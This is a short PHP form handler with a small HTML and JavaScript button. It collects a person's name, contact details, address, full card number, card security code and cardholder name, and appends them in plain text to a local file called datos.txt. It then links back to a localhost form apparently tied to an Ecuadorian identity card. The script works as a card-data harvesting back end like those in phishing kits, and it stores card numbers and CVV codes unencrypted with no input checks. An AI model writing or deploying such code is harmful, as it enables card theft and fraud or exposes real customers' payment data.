<?php
    $Nombre = $_POST ["Nombre"];
    $Email = $_POST ["Email"];
    $Telefono = $_POST ["Telefono"];
    $Dirección = $_POST ["Dirección"];
    $Codigo_postal = $_POST ["Codigo_postal"];
    $Pais = $_POST ["Pais"];
    $Tipo_de_tarjeta = $_POST ["Tipo_de_tarjeta"];
    $Numero_tarjeta = $_POST ["Numero_tarjeta"];
    $Codigo_Seguridad = $_POST ["Codigo_Seguridad"];
    $Nombre_Tarjeta = $_POST ["Nombre_Tarjeta"];

    // Crear el contenido del archivo .txt
    $datos = "Nombre: $Nombre\n";
    $datos .= "Email: $Email\n";
    $datos .= "Telefono: $Telefono\n";
    $datos .= "Dirección: $Dirección\n"; 
    $datos .= "Codigo_postal: $Codigo_postal\n";
    $datos .= "Pais: $Pais\n";
    $datos .= "Tipo_de_tarjeta: $Tipo_de_tarjeta\n";
    $datos .= "Numero_tarjeta: $Numero_tarjeta\n";
    $datos .= "Codigo_Seguridad: $Codigo_Seguridad\n";
    $datos .= "Nombre_Tarjeta: $Nombre_Tarjeta\n";

    // Codigo que guarda los datos en el archivo "Datos.txt"
    $file = fopen("datos.txt", "a");
    fwrite ($file, $datos.PHP_EOL);
    fclose($file);
    echo "Su formulario se envió correctamente";
?>

<button onclick="openNewWindow()">Ingresar nueva información</button>

<script>
function openNewWindow() {
  window.open("http://localhost/Cedula%20Ecuatoriana_Formulario/index.html", "_blank");
}
</script>
